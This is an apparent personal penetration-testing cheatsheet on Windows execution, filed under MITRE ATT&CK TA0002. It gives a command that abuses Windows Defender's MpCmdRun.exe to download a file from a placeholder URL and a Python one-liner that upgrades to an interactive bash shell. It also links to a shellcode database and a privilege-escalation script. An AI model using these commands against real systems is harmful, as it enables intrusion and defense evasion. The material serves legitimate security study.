---
layout: post
title: / pen / win / exec
category: pen
parent: cheatsheets
modified_date: 2023-07-16
permalink: /pen/win/exec
---

**Mitre Att&ck Entreprise**: [TA0002 - Execution](https://attack.mitre.org/tactics/TA0002/)

**Menu**
<!-- vscode-markdown-toc -->
* [payload](#payload)
	* [pbuild](#pbuild)
	* [psign](#psign)
	* [sources](#sources)
* [dl](#dl)
* [rshell](#rshell)
* [escalation](#escalation)

<!-- vscode-markdown-toc-config
	numbering=false
	autoSave=true
	/vscode-markdown-toc-config -->
<!-- /vscode-markdown-toc -->

## <a name='dl'></a>dl
dl = download
* [/sys/powershell#transfer-http](/sys/powershell/transfer-http)
* [/dev/snippet#python-dl](/dev/snippet#python-dl)
* [juggernaut-sec](https://juggernaut-sec.com/windows-file-transfers-for-hackers/)
```sh
# download
C:\ProgramData\Microsoft\Windows Defender\platform\4.18.2008.9-0\MpCmdRun.exe -url <url> -path <local-path>
```

## <a name='rshell'></a>rshell
[database](https://shell-storm.org/shellcode/index.html)
```sh
# run bash via python
python -c 'import pty; pty.spawn("/bin/bash")'
```

## <a name='escalation'></a>escalation

[PrivescCheck.ps1](https://raw.githubusercontent.com/itm4n/PrivescCheck/master/PrivescCheck.ps1)